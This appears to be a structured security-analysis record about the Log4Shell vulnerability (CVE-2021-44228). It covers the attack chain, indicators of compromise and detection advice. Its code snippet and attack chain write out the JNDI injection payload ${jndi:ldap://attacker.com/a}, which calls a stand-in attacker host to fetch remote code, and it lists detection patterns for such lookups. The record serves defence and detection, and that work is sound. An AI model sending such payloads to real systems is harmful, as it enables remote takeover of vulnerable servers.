package_info.why_malicious: The affected versions of Log4j contain a critical remote code execution vulnerability (Log4Shell, CVE-2021-44228) that allows attackers to execute arbitrary code on the server by injecting specially crafted log messages. This vulnerability enables attackers to gain full control over the application and underlying system by leveraging JNDI lookups in log messages, and has been widely exploited in the wild.

execution_context.file_location: Any application code that logs user-controlled input (e.g., logger.info(userInput))

malicious_snippets.code_snippet: logger.info(userInput); // where userInput is attacker-controlled and may contain ${jndi:ldap://attacker.com/a}
malicious_snippets.code_behavior: At runtime, the code logs attacker-controlled input containing a JNDI lookup string, causing Log4j to perform a remote JNDI lookup, which results in the application fetching and executing code from an attacker-controlled server, leading to remote code execution.

malice_analysis.why_suspicious: Logging unsanitized, attacker-controlled input in vulnerable Log4j versions allows injection of JNDI lookup payloads. This can trigger Log4j to perform network requests and load remote code, enabling arbitrary code execution by an attacker.
malice_analysis.violated_expectations: Normal logging should only record messages and never initiate network requests or execute code based on log content. Here, log message content directly leads to network activity and code execution, violating the principle of safe logging.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimately used for dynamic resource resolution in enterprise Java applications, but should never be triggered by untrusted or user-supplied log message content.
key_indicators: Presence of ${jndi:...} patterns in log messages
Use of vulnerable Log4j versions (2.0-beta9 through 2.14.1)
Outbound LDAP, RMI, or HTTP requests initiated by log events
Application code that logs unsanitized user input

attack_chain.action: Attacker sends crafted input containing a JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}) to the application.
attack_chain.leads_to: Application logs the input, triggering the JNDI lookup.

attack_chain.action: Log4j processes the log message and performs a remote JNDI lookup to the attacker's server.
attack_chain.leads_to: Remote code or object is fetched and executed in the application context.

attack_chain.action: Attacker gains remote code execution on the server.
attack_chain.leads_to: Full compromise of the application and potentially the underlying system.

behavioral_signatures: Log messages containing ${jndi:ldap://...}, ${jndi:rmi://...}, or similar patterns
Unexpected outbound LDAP, RMI, or HTTP(S) requests originating from application servers immediately after log events
Execution of code or loading of classes from remote servers triggered by log message processing
file_indicators: Presence of log4j-core-2.0-beta9.jar through log4j-core-2.14.1.jar in application dependencies
Application code that logs unsanitized user input (e.g., logger.info(userInput))
network_indicators: Outbound LDAP, RMI, or HTTP(S) requests to external or untrusted domains following log events
Connections to attacker-controlled infrastructure (e.g., attacker.com) initiated by the application process
detection_knowledge.how_to_detect: Monitor application logs for suspicious patterns such as ${jndi:ldap://}, ${jndi:rmi://}, or similar JNDI lookups. Inspect network traffic for unexpected outbound LDAP, RMI, or HTTP(S) requests from application servers, especially those occurring immediately after log events. Scan application dependencies for vulnerable Log4j versions (2.0-beta9 through 2.14.1). Review code for logging of unsanitized user input. Deploy runtime instrumentation or WAF rules to block or alert on JNDI lookups in log messages.
